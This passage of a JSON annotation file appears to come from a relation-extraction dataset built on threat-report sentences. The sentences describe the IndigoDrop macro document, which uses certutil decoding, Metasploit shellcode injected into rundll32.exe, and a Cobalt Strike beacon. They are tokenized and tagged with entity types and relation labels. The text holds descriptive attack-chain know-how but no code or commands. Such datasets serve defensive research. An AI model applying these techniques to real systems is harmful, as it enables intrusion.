"FR", "evidence": [7], "h": 22, "t": 23}, {"r": "RD", "evidence": [7], "h": 23, "t": 24}, {"r": "IJ", "evidence": [7], "h": 23, "t": 25}]}, {"title": "643-53", "sents": [["The", "payload", "dropped", "to", "disk", "is", "a", "``", ".crt", "''", "file", "."], ["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "payload", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": ".crt", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "file", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "macro", "pos": [7, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "certutil", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "payload binary", "pos": [16, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "endpoint", "pos": [28, 29], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "payload", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "macro", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "attack", "pos": [5, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "dropper", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "beacon", "pos": [18, 19], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [74, 74], "name": "endpoint", "pos": [21, 22], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [79, 79], "name": "binary", "pos": [3, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [85, 85], "name": "endpoint", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "macro", "pos": [13, 14], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "beacon", "pos": [20, 21], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [99, 99], "name": "attack-chain", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [103, 103], "name": "maldoc", "pos": [5, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "macro", "pos": [9, 10], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [110, 110], "name": "macro", "pos": [1, 2], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [113, 113], "name": "code", "pos": [4, 5], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": "shellcode", "pos": [12, 13], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "process", "pos": [21, 22], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "macro code", "pos": [1, 3], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [138, 138], "name": "shellcode", "pos": [6, 7], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [140, 140], "name": "rundll32.exe", "pos": [8, 9], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [145, 145], "name": "server", "pos": [13, 14], "index": "27_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "t": 2, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "EX", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "WR", "evidence": [4], "t": 13, "h": 15}, {"r": "EX", "evidence": [4], "t": 13, "h": 15}, {"r": "ST", "evidence": [4], "t": 14, "h": 15}, {"r": "RF", "evidence": [4], "t": 14, "h": 15}, {"r": "CO", "evidence": [4], "h": 13, "t": 16}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "RD", "evidence": [6], "h": 21, "t": 22}, {"r": "IJ", "evidence": [6], "h": 21, "t": 23}, {"r": "RD", "evidence": [7], "h": 24, "t": 25}, {"r": "IJ", "evidence": [7], "h": 24, "t": 26}, {"r": "ST", "evidence": [7], "h": 24, "t": 27}, {"r": "RF", "evidence": [7], "h": 24, "t": 27}]}, {"title": "643-54", "sents": [["This", "file", "is", "decoded", "by", "the", "malicious", "macro", "using", "certutil", "'", "to", "obtain", "the", "next", "stage", "payload", "binary", "(", "EXE", ")", "which", "is", "then", "executed", "on", "the", "target", "endpoint", "."], ["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "file", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "macro", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "certutil", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "payload binary", "pos": [16, 18], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [28, 28], "name": "endpoint", "pos": [28, 29], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "payload", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "macro", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "attack", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "dropper", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "beacon", "pos": [18, 19], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [62, 62], "name": "endpoint", "pos": [21, 22], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "binary", "pos": [3, 4], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "endpoint", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "macro", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "beacon", "pos": [20, 21], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "attack-chain", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "maldoc", "pos": [5, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "macro", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [98, 98], "name": "macro", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "code", "pos": [4, 5], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [109, 109], "name": "shellcode", "pos": [12, 13], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [118, 118], "name": "process", "pos": [21, 22], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [121, 121], "name": "macro code", "pos": [1, 3], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [126, 126], "name": "shellcode", "pos": [6, 7], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "rundll32.exe", "pos": [8, 9], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [133, 133], "name": "server", "pos": [13, 14], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [139, 139], "name": "shellcode", "pos": [3, 4], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [144, 144], "name": "test samples", "pos": [8, 10], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [151, 151], "name": "IP address", "pos": [15, 17], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "payloads", "pos": [21, 22], "index": "29_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 4}, {"r": "RF", "evidence": [0], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 6}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2], "h": 8, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 10}, {"r": "RF", "evidence": [2], "h": 8, "t": 10}, {"r": "WR", "evidence": [3], "t": 11, "h": 13}, {"r": "EX", "evidence": [3], "t": 11, "h": 13}, {"r": "ST", "evidence": [3], "t": 12, "h": 13}, {"r": "RF", "evidence": [3], "t": 12, "h": 13}, {"r": "CO", "evidence": [3], "h": 11, "t": 14}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "h": 15, "t": 17}, {"r": "FR", "evidence": [5], "h": 18, "t": 19}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "IJ", "evidence": [5], "h": 19, "t": 21}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "IJ", "evidence": [6], "h": 22, "t": 24}, {"r": "ST", "evidence": [6], "h": 22, "t": 25}, {"r": "RF", "evidence": [6], "h": 22, "t": 25}, {"r": "RD", "evidence": [6, 7], "h": 22, "t": 26}, {"r": "WR", "evidence": [6, 7], "h": 22, "t": 27}, {"r": "ST", "evidence": [6, 7], "h": 22, "t": 28}, {"r": "RF", "evidence": [6, 7], "h": 22, "t": 28}, {"r": "WR", "evidence": [6, 7], "h": 22, "t": 29}]}, {"title": "643-55", "sents": [["The", "payload", "activated", "by", "the", "macro", "is", "not", "a", "dropper", "."], ["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "payload", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "macro", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "attack", "pos": [5, 6], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "dropper", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "beacon", "pos": [18, 19], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "endpoint", "pos": [21, 22], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "binary", "pos": [3, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "endpoint", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "macro", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "beacon", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "attack-chain", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "maldoc", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "macro", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [68, 68], "name": "macro", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "code", "pos": [4, 5], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [79, 79], "name": "shellcode", "pos": [12, 13], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "process", "pos": [21, 22], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "macro code", "pos": [1, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "shellcode", "pos": [6, 7], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [98, 98], "name": "rundll32.exe", "pos": [8, 9], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [103, 103], "name": "server", "pos": [13, 14], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [109, 109], "name": "shellcode", "pos": [3, 4], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "test samples", "pos": [8, 10], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [121, 121], "name": "IP address", "pos": [15, 17], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [127, 127], "name": "payloads", "pos": [21, 22], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [134, 134], "name": "downloader", "pos": [1, 2], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [138, 138], "name": "local IP", "pos": [5, 7], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "attackers", "pos": [20, 21], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "IndigoDrop", "pos": [33, 34], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "t": 6, "h": 8}, {"r": "EX", "evidence": [2], "t": 6, "h": 8}, {"r": "ST", "evidence": [2], "t": 7, "h": 8}, {"r": "RF", "evidence": [2], "t": 7, "h": 8}, {"r": "CO", "evidence": [2], "h": 6, "t": 9}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "IJ", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "IJ", "evidence": [5], "h": 17, "t": 19}, {"r": "ST", "evidence": [5], "h": 17, "t": 20}, {"r": "RF", "evidence": [5], "h": 17, "t": 20}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 22}, {"r": "ST", "evidence": [5, 6], "h": 17, "t": 23}, {"r": "RF", "evidence": [5, 6], "h": 17, "t": 23}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 24}, {"r": "ST", "evidence": [7], "h": 25, "t": 26}, {"r": "RF", "evidence": [7], "h": 25, "t": 26}, {"r": "FR", "evidence": [7], "h": 27, "t": 28}]}, {"title": "643-56", "sents": [["This", "early", "variant", "of", "the", "attack", "does", "not", "utilize", "an", "intermediate", "dropper", "to", "download", "and", "activate", "the", "final", "beacon", "on", "the", "endpoint", "."], ["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "attack", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "dropper", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "beacon", "pos": [18, 19], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [21, 21], "name": "endpoint", "pos": [21, 22], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "binary", "pos": [3, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "endpoint", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "macro", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "beacon", "pos": [20, 21], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "attack-chain", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "maldoc", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "macro", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "macro", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "code", "pos": [4, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "shellcode", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "process", "pos": [21, 22], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [80, 80], "name": "macro code", "pos": [1, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "shellcode", "pos": [6, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "rundll32.exe", "pos": [8, 9], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [92, 92], "name": "server", "pos": [13, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [98, 98], "name": "shellcode", "pos": [3, 4], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [103, 103], "name": "test samples", "pos": [8, 10], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [110, 110], "name": "IP address", "pos": [15, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "payloads", "pos": [21, 22], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "downloader", "pos": [1, 2], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [127, 127], "name": "local IP", "pos": [5, 7], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "attackers", "pos": [20, 21], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "IndigoDrop", "pos": [33, 34], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "droppers", "pos": [1, 2], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [163, 163], "name": "IPs", "pos": [6, 7], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "payloads", "pos": [15, 16], "index": "29_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 3}, {"r": "RF", "evidence": [0], "h": 1, "t": 3}, {"r": "WR", "evidence": [1], "t": 4, "h": 6}, {"r": "EX", "evidence": [1], "t": 4, "h": 6}, {"r": "ST", "evidence": [1], "t": 5, "h": 6}, {"r": "RF", "evidence": [1], "t": 5, "h": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 7}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 12, "t": 13}, {"r": "IJ", "evidence": [3], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "h": 15, "t": 16}, {"r": "IJ", "evidence": [4], "h": 15, "t": 17}, {"r": "ST", "evidence": [4], "h": 15, "t": 18}, {"r": "RF", "evidence": [4], "h": 15, "t": 18}, {"r": "RD", "evidence": [4, 5], "h": 15, "t": 19}, {"r": "WR", "evidence": [4, 5], "h": 15, "t": 20}, {"r": "ST", "evidence": [4, 5], "h": 15, "t": 21}, {"r": "RF", "evidence": [4, 5], "h": 15, "t": 21}, {"r": "WR", "evidence": [4, 5], "h": 15, "t": 22}, {"r": "ST", "evidence": [6], "h": 23, "t": 24}, {"r": "RF", "evidence": [6], "h": 23, "t": 24}, {"r": "FR", "evidence": [6], "h": 25, "t": 26}, {"r": "ST", "evidence": [7], "h": 27, "t": 28}, {"r": "RF", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 29}]}, {"title": "643-57", "sents": [["Instead", ",", "the", "binary", "decoded", "and", "executed", "on", "the", "endpoint", "by", "the", "malicious", "macro", "is", "just", "an", "SMB-based", "Cobalt", "Strike", "beacon", "."], ["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "binary", "pos": [3, 4], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "endpoint", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "macro", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "beacon", "pos": [20, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "attack-chain", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "maldoc", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "macro", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "macro", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "code", "pos": [4, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "shellcode", "pos": [12, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "process", "pos": [21, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "macro code", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "shellcode", "pos": [6, 7], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "rundll32.exe", "pos": [8, 9], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [69, 69], "name": "server", "pos": [13, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "shellcode", "pos": [3, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [80, 80], "name": "test samples", "pos": [8, 10], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [87, 87], "name": "IP address", "pos": [15, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "payloads", "pos": [21, 22], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "downloader", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [104, 104], "name": "local IP", "pos": [5, 7], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "attackers", "pos": [20, 21], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "IndigoDrop", "pos": [33, 34], "index": "22_0"}], 